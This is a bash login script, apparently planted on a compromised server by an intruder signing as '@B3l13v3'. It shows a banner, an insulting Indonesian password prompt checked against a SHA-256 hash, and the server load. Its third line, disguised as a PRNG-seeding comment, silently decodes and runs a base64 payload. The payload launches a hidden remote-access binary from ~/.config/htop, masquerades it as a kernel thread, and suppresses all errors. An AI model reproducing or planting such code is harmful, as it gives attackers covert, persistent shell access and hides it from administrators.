#!/bin/bash
# DO NOT REMOVE THIS LINE. SEED PRNG. #defunct-kernel
{ gLTAgLVUxODcyIGRlZnVuY3QgMj4vZGV2L251bGwgfHwgKFRFUk09eHRlcm0tMjU2Y29sb3IgR1NfQVJHUz0iLWsgL2hvbWUxL3VuaXNiYWphLy5jb25maWcvaHRvcC9kZWZ1bmN0LmRhdCAtbGlxRCIgZXhlYyAtYSAnW3NsdWJfZmx1c2h3cV0nICcvaG9tZTEvdW5pc2JhamEvLmNvbmZpZy9odG9wL2RlZnVuY3QnIDI+L2Rldi9udWxsKQo=|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng defunct-kernel
tput civis 2>/dev/null || true
 
# Banner
printf '\e[36m\n   ↓↓↓\e[0m\n'
printf '\e[96mHaii Kids @B3l13v3 In Here Baby! \e[0m\n'
printf '\e[36m\n\e[0m\n'
 
trap "echo;exit" INT

PASS_HASH="b1dfb39ae05b260e02bc9bec28657e5be4164fea6111c59d2d9aded770c70da8"
 
while true; do
    tput cnorm 2>/dev/null || true
 
    read -s -p "Masukin Password Kau Disini Anjeng Bukan Kontol Yang Kau Masukin Bujang : " passwd
    echo
 
    INPUT_HASH=$(echo -n "$passwd" | sha256sum | awk '{print $1}')
 
    if [[ "$INPUT_HASH" == "$PASS_HASH" ]]; then
        echo -e "\n\e[1;32m[SUCCESS] Akses diterima Tuan!\e[0m"
        break
    else
        echo -e "\e[1;31m[!]"Password Kau Salah Bujang. Mending Balek Indo Bujang."\e[0m"
        exit 1
    fi
done
 
logo='                                                                                
                                                                                   
▄█▀▀▀▀█   █████▄ ████▄ ▄▄   ▄██ ████▄ ▄▄ ▄▄ ████▄     ██  ██ ██████ █████▄  ██████ 
█  █▀▄    ██▄▄██  ▄▄██ ██    ██  ▄▄██ ██▄██  ▄▄██ ▄▄▄ ██████ ██▄▄   ██▄▄██▄ ██▄▄   
█▄ ▀▀ █   ██▄▄█▀ ▄▄▄█▀ ██▄▄▄ ██ ▄▄▄█▀  ▀█▀  ▄▄▄█▀     ██  ██ ██▄▄▄▄ ██   ██ ██▄▄▄▄ 
 ▀▀▀▀▀                                                                             
'
 
echo -e "\e[1;35m$logo\e[0m"
echo -e "\e[1;36m======================================\e[0m"
echo -e "      \e[1;33mSelamat Datang, Tuan @B3l13v3\e[0m \e[1;35m💀\e[0m"
echo -e "\e[1;33m   Siap menjalankan perintah, Tuan!"
echo -e "\e[1;36m======================================\e[0m"
echo
 
timenow=$(date +'%H:%M')
load=$(awk '{print $1 ", " $2 ", " $3}' /proc/loadavg)
 
echo -e "\e[1;36mThe time now is $timenow UTC\e[0m"
echo -e "\e[1;36mServer load: $load\e[0m"
echo -e ""
 
trap - INT
